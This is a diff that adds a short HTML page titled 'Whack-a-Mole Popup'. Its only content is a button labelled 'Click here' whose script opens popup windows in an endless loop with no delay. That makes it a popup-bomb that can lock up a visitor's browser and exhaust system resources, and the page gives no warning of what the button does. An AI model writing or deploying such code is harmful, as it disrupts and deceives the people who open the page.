@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Whack-a-Mole Popup</title>
+    <script>
+        function openInfinitePopups() {
+            // Open new popup windows continuously
+            (function openWindows() {
+                // Open a new popup window with a data URL
+                window.open('data:text/html,<html><body><h1>Popup Window</h1><p>This is a popup window.</p></body></html>', 
+                            '_blank', 
+                            'width=300,height=200');
+                // Schedule the next window to open immediately
+                setTimeout(openWindows, 0);
+            })();
+        }
+    </script>
+</head>
+<body>
+    <button onclick="openInfinitePopups()">Click here</button>
+</body>
+</html>
